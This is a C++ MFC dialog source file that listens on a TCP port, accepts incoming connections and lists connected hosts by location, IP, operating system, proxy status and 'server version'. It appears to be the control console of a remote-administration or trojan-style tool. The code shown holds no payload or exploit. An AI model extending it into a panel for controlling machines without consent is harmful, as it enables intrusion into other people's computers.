
// ClientDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "afxdialogex.h"
#include "InitSys.h"
#include "ItemData.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CClientDlg 对话框




CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CClientDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_CLIENT, m_ListClient);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CClientDlg 消息处理程序

BOOL CClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	m_port = PORT;
	InitSystem();
	CreateThread(0,0,OninitSocket,this,0,0); //运行线程

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CClientDlg::InitSystem()
{

	BOOL hbar = m_statusbar.Create(this);// 创建状态栏
    UINT b[2]={1009,1010};// 2栏
    hbar = m_statusbar.SetIndicators(b,2);// 数组， 数目
    m_statusbar.SetPaneInfo(0,b[0],SBPS_NORMAL,400);// 一些设置
    m_statusbar.SetPaneInfo(1,b[1],SBPS_NORMAL,180);
    CString ListenPort; // 
    ListenPort.Format(_T("监听端口：%d"),PORT);
    m_statusbar.SetPaneText(0,ListenPort);// 设置文本
    m_statusbar.SetPaneText(1,_T("在线主机：0 台"));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);// 重设

	m_ListClient.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES|LVS_EX_CHECKBOXES);// 列表框风格设置
    m_ListClient.InsertColumn(0,_T("地理位置"),LVCFMT_LEFT,160);// 插入列
    m_ListClient.InsertColumn(1,_T("IP地址"),LVCFMT_LEFT,110);
    m_ListClient.InsertColumn(2,_T("操作系统"),LVCFMT_LEFT,90);
    m_ListClient.InsertColumn(3,_T("代理状态"),LVCFMT_LEFT,60);
    m_ListClient.InsertColumn(4,_T("服务端版本号"),LVCFMT_LEFT,100);

    GetClientRect(&m_rect);// 获取客户区矩形大小
	return;
}

void CClientDlg::OnSize(UINT nType, int cx, int cy)
{// 改变大小时
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if(nType == SIZE_MINIMIZED)// 最小化
    {
        return;
    }
    // TODO: 在此处添加消息处理程序代码
    CWnd *pWnd;// 窗口类指针
    pWnd = GetDlgItem(IDC_LIST_CLIENT);     //获取控件句柄
    if(pWnd)//判断是否为空，因为对话框创建时会调用此函数，而当时控件还未创建
    {
        CRect rect,rect_l;   //获取控件变化前大小
        GetClientRect(&rect_l);// 获取没变化之前的大小
        pWnd->GetWindowRect(&rect);// 控件矩形
        ScreenToClient(&rect);
        rect.right = cx;// 右边 = 窗口的右边
        rect.bottom= rect.bottom + (rect_l.bottom - m_rect.bottom);// 高度的变化
        pWnd->MoveWindow(rect);//设置控件大小
		
        RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);// 更新一下状态栏
    }
    /*
    else
    {
        delete pWnd;
    }
    */
    GetClientRect(&m_rect);// 再次获取一下窗口的矩形
}


BOOL CClientDlg::PreTranslateMessage(MSG* pMsg)
{// 重载函数，消除回车键关闭程序
	// TODO: 在此添加专用代码和/或调用基类

	if(pMsg->message == WM_KEYDOWN)// 按键消息
	{
		int nVirtKey = (int)pMsg->wParam;
		if(nVirtKey == VK_RETURN || nVirtKey == VK_ESCAPE)// 回车键  || ESC键
		{
			return TRUE;
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}

BOOL CClientDlg::SOCKET_Select(SOCKET hSocket, int nTimeOut, BOOL bRead)
{
	fd_set fdset;
	timeval tv;
	FD_ZERO(&fdset);
	FD_SET(hSocket, &fdset);
	nTimeOut = nTimeOut>1000?1000:nTimeOut;
	tv.tv_sec = 0;
	tv.tv_usec = nTimeOut;

	int iRet = 0;
	if(bRead)// 可读
	{
		iRet = select(0, &fdset, NULL, NULL, &tv);
	}
	else
	{// 可写
		iRet = select(0, NULL, &fdset, NULL, &tv);
	}

	if(iRet<=0)
	{
		return FALSE;
	}
	else if(FD_ISSET(hSocket, &fdset))
	{
		return TRUE;
	}
	return FALSE;
}

DWORD WINAPI CClientDlg::OninitSocket(LPVOID self) //初始化Socket线程
{
    CClientDlg* t = (CClientDlg*)self;
    t->InitSocket();
    return 0;
}
bool CClientDlg::InitSocket() //初始化SOCKET
{
    WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);
	sockaddr_in SLisenaddr;

    SLisen=::socket(AF_INET,SOCK_STREAM,0);
	if(SLisen==SOCKET_ERROR)
	{
		MessageBox(_T("创建连接失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}
	
	SLisenaddr.sin_family=AF_INET;
	SLisenaddr.sin_addr.S_un.S_addr=INADDR_ANY;
	SLisenaddr.sin_port=htons(m_port);
	
	int nRet;
    nRet=::bind(SLisen,(SOCKADDR *)&SLisenaddr,sizeof(SLisenaddr));
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("绑定端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}

	nRet=listen(SLisen,MAXCOUNT);
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("监听端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}

	while(TRUE)
	{
		if(SOCKET_Select(SLisen, 100, TRUE))
		{
			SOCKET ServerSock;
			SOCKADDR_IN Serveraddr;
			int Serveraddrsize=sizeof(Serveraddr);

			ServerSock = accept(SLisen,(sockaddr *)&Serveraddr,&Serveraddrsize);
			if (ServerSock == INVALID_SOCKET)
			{
				continue;
			}
			//AddHost(ServerSock,Serveraddr);
			GetNewItemData(ServerSock,Serveraddr);
			
			Sleep(500);
		}
	}
	return true;
}

void CClientDlg::GetNewItemData(SOCKET sock,SOCKADDR_IN addr) //获取新的条目数据
{
    CItemData *item;
    int id;
    int Count = m_ListClient.GetItemCount();
    if(Count == 0)
    {
        id = 0;
    }
    else
    {
        id = 0;
        for(int i=0;i<Count;i++)
        {
            item = (CItemData*)m_ListClient.GetItemData(i);
            if(item->m_id == id)
            {
                i = 0;
                id = id + 1;
                continue;
            }
        }
    }
    item = NULL;
    item = new CItemData(id,sock,&addr,this->m_hWnd);
    item->Run();
}